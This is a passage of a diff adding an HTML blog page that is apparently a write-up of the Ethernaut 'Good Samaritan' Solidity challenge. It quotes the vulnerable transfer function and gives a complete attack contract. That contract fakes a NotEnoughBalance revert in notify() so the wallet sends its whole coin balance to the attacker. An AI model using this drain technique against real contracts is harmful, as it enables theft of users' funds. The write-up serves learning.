+        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount_</span><span class="p">;</span>
+        <span class="n">balances</span><span class="p">[</span><span class="n">dest_</span><span class="p">]</span> <span class="o">+=</span> <span class="n">amount_</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">dest_</span><span class="p">.</span><span class="n">isContract</span><span class="p">())</span> <span class="p">{</span>
+            <span class="c1">// notify contract (EXPLOIT HERE!!)
+</span>            <span class="n">INotifyable</span><span class="p">(</span><span class="n">dest_</span><span class="p">).</span><span class="n">notify</span><span class="p">(</span><span class="n">amount_</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nb">revert</span> <span class="n">InsufficientBalance</span><span class="p">(</span><span class="n">currentBalance</span><span class="p">,</span> <span class="n">amount_</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>All we need to do is deploy a malicious contract implementing <code class="language-plaintext highlighter-rouge">notify(amount)</code> which simply reverts as <code class="language-plaintext highlighter-rouge">revert NotEnoughBalance()</code>. However, we have to be careful with one detail: it must only revert when the <code class="language-plaintext highlighter-rouge">amount</code> parameters is 10 (or less). See below for code.</p>
+
+<p>This is so that <code class="language-plaintext highlighter-rouge">wallet.donate10(msg.sender)</code> will get reverted on the try statement (since amount=10), but on the catch statement, the call <code class="language-plaintext highlighter-rouge">wallet.transferRemainder(msg.sender)</code> should be allowed to go through, which ends up executing <code class="language-plaintext highlighter-rouge">coin.transfer(attacker, amount=1000000)</code>.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">AttackGoodSamaritan</span> <span class="k">is</span> <span class="n">INotifyable</span> <span class="p">{</span>
+
+    <span class="kt">address</span> <span class="n">victim</span><span class="p">;</span>
+    <span class="n">error</span> <span class="n">NotEnoughBalance</span><span class="p">();</span>
+
+    <span class="k">constructor</span> <span class="p">(</span><span class="kt">address</span> <span class="n">_victim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">_victim</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">attack</span><span class="p">()</span> <span class="k">public</span><span class="p">{</span>
+        <span class="n">IGoodSamaritan</span> <span class="n">g</span> <span class="o">=</span> <span class="n">IGoodSamaritan</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+        <span class="n">g</span><span class="p">.</span><span class="n">requestDonation</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">notify</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">pure</span> <span class="k">public</span> <span class="p">{</span>        
+        <span class="c1">//revert on wallet.donate10(msg.sender), ie. amount=10
+</span>        <span class="c1">//but don't revert on wallet.transferRemainder(msg.sender), ie. amount=1000000
+</span>        <span class="k">if</span><span class="p">(</span><span class="n">_amount</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nb">revert</span> <span class="n">NotEnoughBalance</span><span class="p">();</span>
+        <span class="p">}</span>        
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Indeed, in the foundry Test script logging we see that <code class="language-plaintext highlighter-rouge">coin.balances(&lt;attacker_address&gt;)</code> goes from 0 to 1 million after calling <code class="language-plaintext highlighter-rouge">attack()</code>.</p>
+
+  </div>
+
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy;  - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://axucar.ca/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
